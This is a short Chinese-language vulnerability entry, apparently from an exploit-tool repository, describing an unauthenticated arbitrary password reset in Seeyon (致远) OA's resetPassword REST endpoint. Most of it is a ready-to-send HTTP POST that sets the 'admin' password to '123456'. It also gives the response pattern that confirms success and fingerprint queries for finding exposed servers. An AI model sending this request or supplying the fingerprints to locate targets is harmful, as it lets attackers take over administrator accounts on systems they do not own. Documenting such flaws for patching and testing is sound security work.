---
source: "LittleBear4/OA-EXPTOOL"
---

# 致远OA resetPassword 任意用户密码重置漏洞

## 漏洞描述

致远OA 的 `resetPassword` 接口存在任意用户密码修改漏洞。攻击者无需登录、无需短信验证码，直接向接口提交目标用户名和新密码即可重置该用户密码。

影响版本（模板标注）：Seeyon OA V5/G6、V8.1SP2、V8.2。

## 漏洞复现

```
POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
Host: target
Content-Type: application/json
Accept-Encoding: gzip

{
    "loginName":"admin",
    "password":"123456"
}
```

响应状态码为 200，且响应体中同时包含 `data` 与 `true` 即表示密码重置成功。

## 网络测绘

```
title="致远A8+协同管理软件 V8.1SP2"
app="致远互联-OA"
```

## 参考链接

- https://zhuanlan.zhihu.com/p/656081347（原文链接，抓取时返回 403，未能直接阅读；本条目利用细节依据 OA-EXPTOOL 模板中的完整 PoC）
